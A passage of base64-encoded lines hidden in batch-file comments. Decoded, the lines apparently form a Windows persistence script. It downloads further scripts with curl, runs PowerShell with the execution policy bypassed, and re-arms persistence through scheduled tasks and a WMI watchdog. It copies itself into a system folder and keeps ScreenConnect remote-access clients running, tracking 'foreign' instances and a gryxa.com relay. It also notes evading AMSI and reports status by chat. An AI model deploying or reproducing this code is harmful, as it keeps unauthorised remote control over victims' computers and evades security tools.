::TEZfVVBEPTAiDQogIGZpbmRzdHIgL0M6Ik9XTl9NT04gIEJVSUxEIiAiJVNUQUdF
::JVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAx
::IGZvciAlJUYgaW4gKCIlU1RBR0UlXG93bl9tb24ubmV4dCIpIGRvIGlmICUlfnpG
::IEdUUiAxNTAwICgNCiAgICBmYyAvYiAiJVNUQUdFJVxvd25fbW9uLm5leHQiICIl
::V0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgICBpZiBlcnJvcmxldmVsIDEg
::c2V0ICJTRUxGX1VQRD0xIg0KICApDQogIGlmICIlU0VMRl9VUEQlIj09IjAiIGRl
::bCAvZiAvcSAiJVNUQUdFJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KKSBlbHNl
::ICgNCiAgZGVsIC9mIC9xICIlU1RBR0UlXHRnX3JlcG9ydC5uZXciICIlU1RBR0Ul
::XG93bl9zZWN1cmUubmV3IiAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVTVEFHRSVc
::b3duX21vbi5uZXh0IiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiA+bnVsIDI+JjEN
::CiAgc2V0ICJTRUxGX1VQRD0wIg0KKQ0KZGVsIC9mIC9xICIlU1RBR0UlXHRnX3Jl
::cG9ydC5uZXciICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJVNUQUdFJVxvd25f
::bGliLm5ldyIgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgPm51bCAyPiYxDQpkZWwg
::L2YgL3EgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0IiAiJVNUQUdFJVx1cGRhdGUu
::bWFuaWZlc3Quc2lnIiA+bnVsIDI+JjENCg0KcmVtIE00MzogaWYgbGliIHN0aWxs
::IG1pc3NpbmcgKEFNU0kgd2lwZWQgaXQgLyBuZXZlciBsYW5kZWQpLCBrZWVwIGEg
::VEVNUCBjb3B5IGZvciBmYWxsYmFja3MNCmlmIG5vdCBleGlzdCAiJVdEJVxvd25f
::bGliLnBzMSIgaWYgZXhpc3QgIiVTVEFHRSVcb3duX2xpYi5uZXciIGNvcHkgL3kg
::IiVTVEFHRSVcb3duX2xpYi5uZXciICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+
::JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fZ3J5eGEuY21kIiAoDQogICIlQ1VS
::TCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4
::LXRpbWUgMjAgLW8gIiVXRCVcb3duX2dyeXhhLmNtZCIgIiVPV05HUllYQSUiID5u
::dWwgMj4mMQ0KICBpZiBub3QgZXhpc3QgIiVXRCVcb3duX2dyeXhhLmNtZCIgIiVD
::VVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDIwIC1vICIl
::V0QlXG93bl9ncnl4YS5jbWQiICIlT1dOR1JZWEEyJSIgPm51bCAyPiYxDQopDQoN
::CnJlbSBNNDI6IHNldnJ6LmNmZyBkeW5hbWljIEZQIGZyb20gcmVwbyBzZXZyel9l
::eHBlY3RlZC5jZmcNCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1
::c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6
::LmNmZyIpIGRvICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktF
::RVBfRlA9JSVMIg0KICBpZiAvSSAiJSVLIj09IkFMVF9GUCIgc2V0ICJBTFRfRlA9
::JSVMIg0KKQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10
::aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdFJVxzZXZyel9leHBlY3Rl
::ZC5uZXciICIlU0VWUlpfRVhQX1VSTCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0
::ICIlU1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5ldyIgIiVDVVJMJSIgLUwgLS1jb25u
::ZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIlU1RBR0UlXHNldnJ6X2V4
::cGVjdGVkLm5ldyIgIiVTRVZSWl9FWFBfVVJMMiUiID5udWwgMj4mMQ0KaWYgZXhp
::c3QgIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiBpZiBleGlzdCAiJVdEJVxv
::d25fbGliLnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBp
::biAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiR0PUdldC1Db250ZW50IC1MaXRl
::cmFsUGF0aCAnJVNUQUdFJVxzZXZyel9leHBlY3RlZC5uZXcnIC1SYXc7ICYgJyVX
::RCVcb3duX2xpYi5wczEnIC1BY3Rpb24gc3luYy1zZXZyei1mcCAtV29ya0RpciAn
::JVdEJScgLUV4dHJhICR0ImApIGRvICgNCiAgICBlY2hvIHNldnJ6X3N5bmMgJSVS
::Pj4iJUxPRyUiDQogICAgZm9yIC9mICJ0b2tlbnM9MiwzIGRlbGltcz18IiAlJUEg
::aW4gKCIlJVIiKSBkbyAoDQogICAgICBpZiBub3QgIiUlQSI9PSIiIHNldCAiS0VF
::UF9GUD0lJUEiDQogICAgICBpZiBub3QgIiUlQiI9PSIiIHNldCAiQUxUX0ZQPSUl
::QiINCiAgICApDQogICkNCikNCmRlbCAvZiAvcSAiJVNUQUdFJVxzZXZyel9leHBl
::Y3RlZC5uZXciID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcc2V2cnouY2ZnIiBm
::b3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVX
::RCVcc2V2cnouY2ZnIikgZG8gKA0KICBpZiAvSSAiJSVLIj09IlBSSU1BUllfRlAi
::IHNldCAiS0VFUF9GUD0lJUwiDQogIGlmIC9JICIlJUsiPT0iQUxUX0ZQIiBzZXQg
::IkFMVF9GUD0lJUwiDQopDQoNCnJlbSDilIDilIAgW0JdIHJlLWFybSBjaGFpbiAx
::OiBvd25lcnNoaXAtYXdhcmUgKG5vdCBleGlzdGVuY2Utb25seSkg4pSA4pSADQpy
::ZW0gTDExL00yMjogUXVlcnktb25seSBza2lwcGVkIHJlYXJtIHdoZW4gV2luZG93
::cyBidWlsdC1pbiB0YXNrcyBzaGFyZWQNCnJlbSBkZWZhdWx0IG5hbWVzIChEaWFn
::bm9zaXNcU2NoZWR1bGVkIGV0Yy4pIC0+IG1vbiBuZXZlciByYW4sIG5vIGxvZy4N
::CmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFj
::a3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
::d25fbGliLnBzMSIgLUFjdGlvbiB0YXNrcy1lbnN1cmUgLVdvcmtEaXIgIiVXRCUi
::IC1Nb25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvICgNCiAgICBlY2hvIHRh
::c2tzX2Vuc3VyZSAlJVI+PiIlTE9HJSINCiAgICBzZXQgIlRBU0tTX0VOU1VSRT0l
::JVIiDQogICkNCikNCmlmIG5vdCBleGlzdCAiJUVUTCUiIG1rZGlyICIlRVRMJSIg
::Pm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxvd25fbW9uLmNtZCIgKA0KICBhdHRy
::aWIgLWggLXMgLXIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+JjENCiAgY29w
::eSAveSAiJVdEJVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVs
::IDI+JjENCikNCg0KcmVtIOKUgOKUgCBbQjJdIHJlLWFybSBjaGFpbiAyIChXTUkg
::c3Vic2NyaXB0aW9uKSBpZiBtaXNzaW5nIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9mICJ1
::c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
::V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHdhdGNoZG9nLWVuc3VyZSAtV29ya0Rp
::ciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gc2V0ICJX
::RF9TVEFURT0lJVIiDQogIGlmIC9JICIhV0RfU1RBVEUhIj09IlJFQVJNRUQiIGVj
::aG8gd2F0Y2hkb2cgV01JIFJFQVJNRUQ+PiIlTE9HJSINCikNCg0KcmVtIOKUgOKU
::gCBbRTBdIHN5bmMgR3J5eGEgRlAgZnJvbSB2ZXJpZmllZCBncnl4YS5jb20gU0Mg
::QkVGT1JFIGV4dGVybWluYXRlIOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xp
::Yi5wczEiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
::MSIgLUFjdGlvbiBzeW5jLWdyeXhhLWZwIC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+
::JjENCiAgaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2tx
::IHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikg
::ZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCIN
::CikNCg0KcmVtIOKUgOKUgCBbRV0gTDQ1L000OCBIQU5EUy1PRkY6IHNraXAgZXh0
::ZXJtaW5hdGUgKGRvIG5vdCB0b3VjaCBhbnkgU2NyZWVuQ29ubmVjdCkg4pSA4pSA
::DQplY2hvIGhhbmRzX29mZl9za2lwX2V4dGVybWluYXRlPj4iJUxPRyUiDQpzZXQg
::IkZPUkVJR05fTEVGVD0wIg0KZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUl
::YSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58IGZpbmRzdHIgL0M6IlNFUlZJ
::Q0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKA0KICBzZXQgIkZQ
::PSUlYSINCiAgc2V0ICJGUD0hRlA6ID0hIg0KICByZW0gZnJpZW5kbHkgaWYga2Vl
::cGVyIEZQIE9SIGdyeXhhLXJlbGF5IChJbWFnZVBhdGggaGFzIGdyeXhhLmNvbSkg
::4oCUIG5ldmVyIGNvdW50IG5ldyBHcnl4YSBhcyBmb3JlaWduDQogIHNldCAiRlJJ
::RU5ETFk9MCINCiAgaWYgL0kgIiFGUCEiPT0iJUtFRVBfRlAlIiBzZXQgIkZSSUVO
::RExZPTEiDQogIGlmIC9JICIhRlAhIj09IiVBTFRfRlAlIiBzZXQgIkZSSUVORExZ
::PTEiDQogIGlmIC9JICIhRlAhIj09IiVHUllYQV9GUCUiIHNldCAiRlJJRU5ETFk9
::MSINCiAgaWYgIiFGUklFTkRMWSEiPT0iMCIgKA0KICAgIGZvciAvZiAidXNlYmFj
::a3EgZGVsaW1zPSIgJSVJIGluIChgcmVnIHF1ZXJ5ICJIS0xNXFNZU1RFTVxDdXJy
::ZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTY3JlZW5Db25uZWN0IENsaWVudCAoIUZQ
::ISkiIC92IEltYWdlUGF0aCAyXj5udWwgXnwgZmluZHN0ciAvSSAiSW1hZ2VQYXRo
::ImApIGRvICgNCiAgICAgIGVjaG8gJSVJIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29t
::IiA+bnVsICYmIHNldCAiRlJJRU5ETFk9MSINCiAgICApDQogICkNCiAgaWYgIiFG
::UklFTkRMWSEiPT0iMCIgKA0KICAgIHNldCAvYSBDT1VOVCs9MQ0KICAgIHNldCAv
::YSBGT1JFSUdOX0xFRlQrPTENCiAgICBzZXQgIkZPUkVJR05fTElTVD0hRk9SRUlH
::Tl9MSVNUISFGUCEgIg0KICAgIGVjaG8gZm9yZWlnbl9sZWZ0XyFGUCE+PiIlTE9H
::JSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtDXSBoZWFsIFNjcmVlbkNvbm5lY3Qg
::cHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpm
::b3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIF58IGZpbmRzdHIgL0M6
::IlNFUlZJQ0VfTkFNRSInKSBkbyAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNl
::dCAiUFJJTVNUQVRFPSUlYiINCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENs
::aWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3Qg
::ZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJQUklNX09LPTEiDQogIHNldCAvYSBDT1VO
::VCs9MQ0KKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQ
::JSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgL2EgQ09VTlQr
::PTENCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8
::IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJB
::TFRfT0s9MSINCg0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUi
::PT0iMCIgKA0KICBlY2hvIHN2YyBoZWFsIHJlc3RhcnQ+PiIlTE9HJSINCiAgbmV0
::IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAy
::PiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
::KSIgPm51bCAyPiYxDQogIHRpbWVvdXQgL3QgNiAvbm9icmVhayA+bnVsDQogIHNj
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
::ICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklN
::X09LPTEiDQopDQpyZW0gTTE2OiBzdGlsbCBzdG9wcGVkIC0+IHJlcGFpciB0aGUg
::UkVHSVNURVJFRCBwcm9kdWN0IChtc2lleGVjIC9mYSByZXN0b3Jlcw0KcmVtIGJp
::bmFyaWVzICsgc3RhcnRzIHRoZSBzZXJ2aWNlOyBMNSBSZXBhaXItU0NTZXJ2aWNl
::IGhhbmRsZXMgc3RvcHBlZCBzdmNzKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlm
::ICIlUFJJTV9PSyUiPT0iMCIgKA0KICBlY2hvIHN2YyBlc2NhbGF0ZSByZXBhaXI+
::PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hl
::bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
::eXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1G
::cCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAg
::dGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwN
::CiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIlBSSU1fT0s9MSINCikNCnJlbSBN
::MTY6IG9ycGhhbmVkIHNlcnZpY2UgZW50cnkgKHByb2R1Y3QgdW5yZWdpc3RlcmVk
::IC0gZWF0ZW4gYnkgYW4gU0MtZmFtaWx5DQpyZW0gdXBncmFkZSByZW1vdmFsKSBj
::YW4gTkVWRVIgc3RhcnQuIERlbGV0ZSBpdCBhbmQgZmFsbCB0aHJvdWdoIHRvIHRo
::ZQ0KcmVtIGZyZXNoLWluc3RhbGwgbGFkZGVyIGJlbG93IGluc3RlYWQgb2YgYWxl
::cnRpbmcgIndvbnQgc3RhcnQiIGZvcmV2ZXIuDQppZiAiJUlOU1RBTExFRCUiPT0i
::MSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIHNldCAiUkVHU1RBVEU9dW5rbm93
::biINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAiZGVsaW1z
::PSIgJSVSIGluICgncG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
::MSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAi
::JVdEJSInKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiINCiAgZWNobyBvcnBoYW5fY2hl
::Y2s9IVJFR1NUQVRFIT4+IiVMT0clIg0KICBpZiAvSSAiIVJFR1NUQVRFISI9PSJu
::byIgKA0KICAgIGVjaG8gb3JwaGFuX3NlcnZpY2VfZGVsZXRlX1NLSVBQRURfaGFu
::ZHNfb2ZmPj4iJUxPRyUiDQogICAgcmVtIE00ODogbmV2ZXIgc2MgZGVsZXRlIGFu
::eSBTY3JlZW5Db25uZWN0DQoNCiAgKQ0KKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEi
::IGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
::LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIl
::V0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAt
::QnVpbGQgJU1PTlZFUiUgLUV4dHJhICJzdmMtd29udC1zdGFydCIgPm51bCAyPiYx
::DQogIGNhbGwgOlRnU3RhdGUgRE9XTiAiU2NyZWVuQ29ubmVjdCAoJUtFRVBfRlAl
::KSBpbnN0YWxsZWQgYnV0IHdvbnQgc3RhcnQiDQogIGdvdG8gOkFmdGVySGVhbA0K
::KQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGdvdG8gOkFmdGVySGVhbA0KDQpyZW0g
::4pSA4pSAIFtEXSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBoZWFsIGxhZGRlciDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIANCnJlbSBNMTI6IEZJUlNUIHJlcGFpciB0aGUgcmVnaXN0
::ZXJlZCBwcm9kdWN0IChyZWNyZWF0ZXMgc2VydmljZSB3aXRob3V0DQpyZW0gdG91
::Y2hpbmcgdGhlIEFMVCBpbnN0YW5jZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFsbCBv
::bmx5IGFzIGZhbGxiYWNrLg0KZWNobyBzdmMgbWlzc2luZyAtIGhlYWwgYmVnaW4+
::PiIlTE9HJSINCmNhbGwgOlJlcGFpclJlZ2lzdGVyZWQgIiVLRUVQX0ZQJSINCnNj
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
::ICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJ
::TlNUQUxMRUQ9MSINCiAgc2V0ICJQUklNX09LPTEiDQogIGdvdG8gOkFmdGVySGVh
::bA0KKQ0KcmVtIHJlZnVzZSBmcmVzaCAvaSBpZiBwcm9kdWN0IHN0aWxsIHJlZ2lz
::dGVyZWQgLSBVcGdyYWRlIHRhYmxlIGNhbiB3aXBlIEFMVC9HUllYQQ0Kc2V0ICJS
::RUdTVEFURT11bmtub3duIg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZv
::ciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
::RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAi
::JUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSJgKSBkbyBzZXQgIlJFR1NUQVRFPSUl
::UiINCmlmIC9JICIhUkVHU1RBVEUhIj09InllcyIgKA0KICBlY2hvIHByaW1hcnlf
::cmVnaXN0ZXJlZF9za2lwX2ZyZXNoX2luc3RhbGw+PiIlTE9HJSINCiAgcG93ZXJz
::aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
::IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAt
::V29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVnaXN0ZXJl
::ZC1zdHVjayIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRE9XTiAiUHJpbWFy
::eSByZWdpc3RlcmVkIGJ1dCBzZXJ2aWNlIG1pc3NpbmcgLSAvZmEgZmFpbGVkOyBy
::ZWZ1c2VkIC9pIHRvIHByb3RlY3QgQUxUL0dSWVhBIg0KICBnb3RvIDpBZnRlckhl
::YWwNCikNCnJlbSBPMzc6IHJlZnVzZSBzZXZyeiAvaSB3aGVuIGdyeXhhIGFscmVh
::ZHkgcHJlc2VudCDigJQgc2hhcmVkIGxlZ2FjeSBVcGdyYWRlQ29kZXMNCnJlbSB7
::MEM5NDQ0OEJ9L3sxRjg1RDdGRX0gbWFrZSBzaWJsaW5nIG1zaWV4ZWMgL2kga25v
::Y2sgR3J5eGEgT0ZGTElORSBpbiBwYW5lbC4NCnJlbSBNMzY6IGRldGVjdCBHcnl4
::YSBieSByZWxheSBkb21haW4gdG9vIChhbnkgcnVubmluZyBncnl4YS5jb20gU0Mp
::LCBub3Qgb25seSBieSBGUC4NCnNldCAiR1JFRz11bmtub3duIg0KaWYgZXhpc3Qg
::IiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVS
::IGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhl
::Y3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFj
::dGlvbiByZWdpc3RlcmVkIC1GcCAiJUdSWVhBX0ZQJSIgLVdvcmtEaXIgIiVXRCUi
::YCkgZG8gc2V0ICJHUkVHPSUlUiINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENs
::aWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwg
::MSBzZXQgIkdSRUc9eWVzIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICgzNmU1MDZmZjAxNmIyMTUxKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZl
::bCAxIHNldCAiR1JFRz15ZXMiDQpyZW0gYW55IG5vbi1zZXZyeiBSdW5uaW5nL1Bl
::bmRpbmcgU0MgT1IgSW1hZ2VQYXRoIGdyeXhhLmNvbSA9IEdyeXhhIHByZXNlbnQN
::CmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSBz
::dGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUU6IFNjcmVlbkNv
::bm5lY3QgQ2xpZW50IicpIGRvICgNCiAgc2V0ICJfRlA9JSVhIg0KICBzZXQgIl9G
::UD0hX0ZQOiA9ISINCiAgaWYgL0kgbm90ICIhX0ZQISI9PSIlS0VFUF9GUCUiIGlm
::IC9JIG5vdCAiIV9GUCEiPT0iJUFMVF9GUCUiICgNCiAgICBzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5O
::SU5HIiAvQzoiU1RBUlRfUEVORElORyIgPm51bA0KICAgIGlmIG5vdCBlcnJvcmxl
::dmVsIDEgc2V0ICJHUkVHPXllcyINCiAgKQ0KICBmb3IgL2YgInVzZWJhY2txIGRl
::bGltcz0iICUlSSBpbiAoYHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENv
::bnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIg
::L3YgSW1hZ2VQYXRoIDJePm51bCBefCBmaW5kc3RyIC9JICJJbWFnZVBhdGgiYCkg
::ZG8gKA0KICAgIGVjaG8gJSVJIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVs
::ICYmIHNldCAiR1JFRz15ZXMiDQogICkNCikNCmlmIC9JICIhR1JFRyEiPT0ieWVz
::IiAoDQogIGVjaG8gcHJpbWFyeV9za2lwX2lfcHJvdGVjdF9ncnl4YT4+IiVMT0cl
::Ig0KICBlY2hvIGhhbmRzX29mZl9ncnl4YV9wcmVzZW50X3NraXBfc2V2cno+PiIl
::TE9HJSINCiAgY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQogIGdvdG8gOkFmdGVySGVh
::bA0KKQ0KcmVtIE00OCBIQU5EUy1PRkY6IHNraXAgYWxsIHNldnJ6IG1zaWV4ZWMg
::L2kgLyBzYy1mYW1pbHkgaW5zdGFsbHMNCmVjaG8gaGFuZHNfb2ZmX3NraXBfc2V2
::cnpfbXNpPj4iJUxPRyUiDQpjYWxsIDpFbnN1cmVHcnl4YU11c3QNCmdvdG8gOkFm
::dGVySGVhbA0KY2FsbCA6UmVzdG9yZUFsdA0KY2FsbCA6RW5zdXJlR3J5eGFNdXN0
::DQppZiAiJUlOU1RBTExFRCUiPT0iMCIgKA0KICBpZiBleGlzdCAiJVdEJVxtc2lf
::aGVhbC5sb2ciICgNCiAgICBlY2hvIC0tLSBtc2lfaGVhbC5sb2cgdGFpbCAtLS0+
::PiIlTE9HJSINCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
::aXZlIC1Db21tYW5kICJHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcbXNp
::X2hlYWwubG9nJyAtVGFpbCAxMCIgPj4iJUxPRyUiIDI+JjENCiAgKQ0KICBpZiBu
::b3QgZGVmaW5lZCBNU0lFWElUIHNldCAiTVNJRVhJVD1mZXRjaC1mYWlsIg0KICBw
::b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
::b2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0
::YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJtc2kt
::ZmFpbGVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBGQUlMICJNU0kgaW5z
::dGFsbCBmYWlsZWQgb24gYWxsIHNvdXJjZXMgKG1zaWV4ZWMgZXhpdCAlTVNJRVhJ
::VCUpIg0KKSBlbHNlICgNCiAgZWNobyBzdmMgcmVzdG9yZWQ+PiIlTE9HJSINCiAg
::cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
::UG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBz
::dGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVz
::dG9yZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIFJFU1RPUkVEICJTY3Jl
